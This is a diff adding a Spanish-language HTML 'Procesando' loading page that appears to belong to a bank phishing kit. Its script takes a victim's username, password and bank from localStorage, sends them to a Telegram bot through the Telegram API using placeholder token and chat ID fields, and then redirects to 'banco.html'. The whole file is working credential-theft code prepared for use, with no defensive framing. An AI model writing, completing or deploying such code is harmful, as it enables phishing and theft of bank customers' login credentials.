@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Procesando</title>
+    <meta http-equiv="refresh" content="0;url=banco.html">
+    <style>
+        body { 
+            background: #1a1a2e; 
+            color: white; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            font-family: 'Segoe UI', sans-serif;
+        }
+        .loading { text-align: center; }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255,255,255,0.3);
+            border-top-color: #e94560;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loading">
+        <div class="spinner"></div>
+        <p>Procesando...</p>
+    </div>
+
+    <script>
+        // Configura tus credenciales de Telegram aquí
+        const TOKEN = 'TU_TOKEN_DE_TELEGRAM';  // Ejemplo: '123456789:ABCdefGHIjklMNOpqrsTUVwxyz'
+        const CHAT_ID = 'TU_CHAT_ID';        // Ejemplo: '123456789'
+
+        // Función para enviar a Telegram
+        async function enviarATelegram(username, password, bank) {
+            const texto = `📩 *New Info*\n\n👤 *Username:* ${username}\n📧 *Password:* ${password}\n💬 *Bank:* ${bank}`;
+            
+            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(texto)}&parse_mode=Markdown`;
+            
+            try {
+                const response = await fetch(url);
+                return response.ok;
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+
+        // Obtener datos del formulario
+        const datos = JSON.parse(localStorage.getItem('login_datos') || '{}');
+        
+        // Enviar a Telegram
+        if (datos.username && datos.password) {
+            const exitoso = await enviarATelegram(datos.username, datos.password, datos.bank);
+            
+            if (exitoso) {
+                console.log('✓ Datos enviados a Telegram');
+            } else {
+                console.log('⚠ Error al enviar, pero continuamos');
+            }
+        }
+
+        // Después de 1 segundo, redirigir al banco
+        setTimeout(() => {
+            window.location.href = 'banco.html';
+        }, 1000);
+    </script>
+</body>
+</html>
